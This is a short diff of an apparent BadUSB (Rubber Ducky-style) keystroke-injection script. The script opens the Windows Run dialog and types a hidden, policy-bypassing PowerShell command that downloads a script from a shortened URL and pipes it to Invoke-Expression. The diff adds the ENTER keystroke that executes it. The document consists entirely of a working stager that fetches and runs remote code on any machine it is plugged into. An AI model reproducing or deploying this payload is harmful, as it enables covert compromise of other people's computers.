@@ -3,3 +3,4 @@ REM Author: Contrxl
 GUI r 
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass $db='';irm https://rebrand.ly/9d0qne7|iex
+ENTER
